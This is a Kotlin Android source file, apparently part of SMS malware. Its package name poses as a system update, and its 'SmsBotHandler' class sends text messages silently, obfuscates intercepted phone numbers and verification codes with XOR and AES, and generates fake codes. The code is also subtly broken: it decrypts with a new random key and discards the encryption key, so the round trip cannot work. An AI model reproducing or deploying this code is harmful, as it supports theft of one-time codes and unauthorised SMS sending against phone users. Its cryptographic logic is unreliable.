package com.system.updates.modules

import android.content.Context
import android.telephony.SmsManager
import android.util.Base64
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SmsBotHandler {
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77.toByte(), 0x88.toByte())

    private fun xor(b: ByteArray): ByteArray {
        return b.mapIndexed { i, v -> (v.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    private fun aesDec(enc: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = enc.sliceArray(0..11)
        val ct = enc.sliceArray(12 until enc.size)
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.DECRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return c.doFinal(ct)
    }

    fun sendSms(ctx: Context, phone: String, message: String): Boolean {
        return try {
            val sms = SmsManager.getDefault()
            sms.sendTextMessage(phone, null, message, null, null)
            true
        } catch (e: Exception) {
            false
        }
    }

    fun interceptSms(ctx: Context, phone: String, code: String): String {
        val raw = "$phone:$code".toByteArray()
        val x = xor(raw)
        val key = ByteArray(32).also { r.nextBytes(it) }
        val enc = aesEnc(x, key)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }

    fun decodeIntercepted(ctx: Context, data: String): String {
        val enc = Base64.decode(data, Base64.NO_WRAP)
        val key = ByteArray(32).also { r.nextBytes(it) }
        val dec = aesDec(enc, key)
        val plain = xor(dec)
        return String(plain)
    }

    fun generateFakeCode(ctx: Context): String {
        return (r.nextInt(900000) + 100000).toString()
    }
}